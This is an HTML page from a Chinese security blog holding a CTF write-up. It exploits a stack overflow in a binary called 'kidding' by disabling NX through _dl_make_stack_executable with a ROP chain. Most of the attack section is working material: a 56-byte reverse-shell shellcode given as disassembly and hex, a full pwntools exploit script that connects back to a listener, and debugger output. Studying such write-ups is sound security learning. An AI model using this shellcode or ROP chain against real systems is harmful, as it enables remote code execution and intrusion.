@@ -1,0 +1,273 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>关闭nx与反弹shell | Another&#39;s blog</title>
+  <meta name="author" content="another" />
+
+  
+  <meta name="description" content="程式描述本題程式為statically linked，
+在本題中明顯提供解題者一個stack buffer overflow的漏洞，
+但因為程式有NX保護，必須使用ROP來控制程式行為。
+在寫入的第12byte後開始覆蓋main的return address，
+共計有88 bytes的overflo" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="关闭nx与反弹shell" />
+  <meta property="og:site_name" content="Another&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="Another&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Another&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-10-21T06:01:10.128Z"><a href="/2018/10/21/关闭nx与反弹shell/">2018-10-21</a></time>
+      
+      
+  
+    <h1 class="title">关闭nx与反弹shell</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="程式描述"><a href="#程式描述" class="headerlink" title="程式描述"></a>程式描述</h1><pre><code>本題程式為statically linked，
+在本題中明顯提供解題者一個stack buffer overflow的漏洞，
+但因為程式有NX保護，必須使用ROP來控制程式行為。
+在寫入的第12byte後開始覆蓋main的return address，
+共計有88 bytes的overflow空間。
+在程式read完以後便切斷該程式對client的連線，
+即使拿到shell也無法操控該shell。
+</code></pre><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code>較簡單的解決辦法為建立一個reverse shell，
+但如果全部只使用ROP最多只能放入22個gadgets
+（包括argument與padding等等）。
+所幸程式中可以找到_dl_make_stack_executable這個function以幫助解除NX保護，
+接著便可以shellcode來產生一個reverse shell。
+</code></pre><h1 id="解除stack的NX保護"><a href="#解除stack的NX保護" class="headerlink" title="解除stack的NX保護"></a>解除stack的NX保護</h1><pre><code>將__stack_prot設為7。
+將__libc_stack_end的address放入eax中。
+调用_dl_make_stack_executable。
+解除NX後使用call esp的gadget來執行接著放在stack中的shellcode，截至目前為止最少共需占用8格stack，也就是32 bytes。
+
+放入reverse shell的shellcode
+建立reverse shell須執行socket、dup2、connect、execve等指令，
+由於總共只有88 bytes的空間，且已用掉32 bytes來解除NX，
+剩下只能放入最多56 bytes的shellcode來完成reverse shell。但網路上所提供的shellcode最短也要將近70 bytes，距離需求的56 bytes仍有不少距離。以下是兩種解決辦法，在比賽時我們是使用第一種解法：
+
+想辦法硬縮，擠到56 bytes為止（我們使用的辦法）
+由於網路上提供的shellcode必須夠general以應付幾乎所有程式state，
+若能應用當時程式的某些state便可減少一點size。
+由於fd中0、1、2皆已被close，
+拿到的socket fd即已為0，因此只需進行一次dup2。
+由於ebp可控（ebp的值會等於input中的第8~11 byte），
+由此可以push ebp取代一次push 0xXXXXXXXX，省下4 bytes。
+push port時使用ax中已有的數值（0x66），
+port（big endian）將被固定為0x6600（26112）。
+</code></pre><p>此為最後所使用的shellcode（共56 bytes），其中IP位置須位於ebp當中、port固定為26112：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> 0:   6a 01                   push   0x1</span><br><span class="line"> 2:   5b                      pop    ebx</span><br><span class="line"> 3:   99                      cdq</span><br><span class="line"> 4:   b0 66                   mov    al,0x66</span><br><span class="line"> 6:   52                      push   edx</span><br><span class="line"> 7:   53                      push   ebx</span><br><span class="line"> 8:   6a 02                   push   0x2</span><br><span class="line"> a:   89 e1                   mov    ecx,esp</span><br><span class="line"> c:   cd 80                   int    0x80</span><br><span class="line"> e:   5e                      pop    esi</span><br><span class="line"> f:   59                      pop    ecx</span><br><span class="line">10:   93                      xchg   ebx,eax</span><br><span class="line">11:   b0 3f                   mov    al,0x3f</span><br><span class="line">13:   cd 80                   int    0x80</span><br><span class="line">15:   b0 66                   mov    al,0x66</span><br><span class="line">17:   55                      push   ebp</span><br><span class="line">18:   66 50                   push   ax</span><br><span class="line">1a:   66 56                   push   si</span><br><span class="line">1c:   89 e1                   mov    ecx,esp</span><br><span class="line">1e:   0e                      push   cs</span><br><span class="line">1f:   51                      push   ecx</span><br><span class="line">20:   53                      push   ebx</span><br><span class="line">21:   89 e1                   mov    ecx,esp</span><br><span class="line">23:   b3 03                   mov    bl,0x3</span><br><span class="line">25:   cd 80                   int    0x80</span><br><span class="line">27:   b0 0b                   mov    al,0xb</span><br><span class="line">29:   59                      pop    ecx</span><br><span class="line">2a:   68 2f 73 68 00          push   0x68732f</span><br><span class="line">2f:   68 2f 62 69 6e          push   0x6e69622f</span><br><span class="line">34:   89 e3                   mov    ebx,esp</span><br><span class="line">36:   cd 80                   int    0x80</span><br></pre></td></tr></table></figure></p>
+<p>32位关闭nx<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">construct_rop</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">	a=ELF(<span class="string">'./kidding'</span>)</span><br><span class="line">	rop = ROP(a)</span><br><span class="line">	<span class="comment"># __stack_prot = 7</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop ecx'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__stack_prot'</span>))</span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop dword ptr [ecx]'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(<span class="number">7</span>)</span><br><span class="line">	<span class="comment"># call _dl_make_stack_executable</span></span><br><span class="line">	rop.raw(rop.find_gadget([<span class="string">'pop eax'</span>, <span class="string">'ret'</span>]).address)</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'__libc_stack_end'</span>))</span><br><span class="line">	rop.raw(rop.resolve(<span class="string">'_dl_make_stack_executable'</span>))</span><br><span class="line">	<span class="comment"># Run our shellcode</span></span><br><span class="line">	rop.raw(<span class="number">0x080c99b0</span>) <span class="comment"># call esp</span></span><br><span class="line">	<span class="comment">#print disasm(self.reverse_shellcode)</span></span><br><span class="line">	to_send  = (</span><br><span class="line">	 str(rop) </span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> to_send</span><br><span class="line">reverse_shellcode = (</span><br><span class="line"><span class="string">"\x6a\x01\x5b\x99\xb0\x66\x52\x53\x6a"</span></span><br><span class="line"><span class="string">"\x02\x89\xe1\xcd\x80\x5e\x59\x93\xb0\x3f"</span></span><br><span class="line"><span class="string">"\xcd\x80\xb0\x66\x55\x66\x50\x66\x56"</span></span><br><span class="line"><span class="string">"\x89\xe1\x0e\x51\x53"</span></span><br><span class="line"><span class="string">"\x89\xe1\xb3\x03\xcd\x80\xb0\x0b\x59\x68\x2f\x73\x68"</span></span><br><span class="line"><span class="string">"\x00\x68\x2f\x62\x69\x6e\x89\xe3"</span></span><br><span class="line"><span class="string">"\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line">p=process(<span class="string">'./kidding'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b *0x080488B6  '</span>)</span><br><span class="line">listen_port      = <span class="number">0x6600</span></span><br><span class="line">listener = listen(listen_port)</span><br><span class="line">p.send(<span class="string">'A'</span> * <span class="number">8</span> + binary_ip(<span class="string">'127.0.0.1'</span>)+construct_rop()+reverse_shellcode)</span><br><span class="line">listener.interactive()</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3ccc ◂— 0x2</span><br><span class="line">01:0004│          0xffce3cd0 ◂— 0x1</span><br><span class="line">02:0008│          0xffce3cd4 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       ebx: 0x1</span><br><span class="line">        ecx: 0xffce3ccc ◂— 0x2</span><br><span class="line">        edx: 0x0</span><br><span class="line">        esi: 0x80ea00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8066de0 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00:0000│ ecx esp  0xffce3cc0 ◂— 0x0</span><br><span class="line">01:0004│          0xffce3cc4 —▸ 0xffce3ccc ◂— 0x660002</span><br><span class="line">02:0008│          0xffce3cc8 ◂— 0x23 /* &apos;#&apos; */</span><br><span class="line">03:000c│          0xffce3ccc ◂— 0x660002</span><br><span class="line">04:0010│          0xffce3cd0 ◂— 0x1000</span><br><span class="line">        ebx: 0x3</span><br><span class="line">        ecx: 0xffce3cc0 ◂— 0x0</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">archives</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/10/21/线下赛/">线下赛</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/堆溢出/">堆溢出</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/分布式/">分布式搭建</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/内核编译/">内核编译</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/两道内核/">两道内核</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/windows机制/">windows机制</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/web/">随意码的web</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/sulb/">slub</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/patch/">patch</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/offbyone/">off-by-one</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hfo/">house-of-orange</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/hexo/">搭建博客</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/doublefree/">double free</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/brop/">brop</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/bpf/">bpf</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/21/afl/">afl</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 another
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
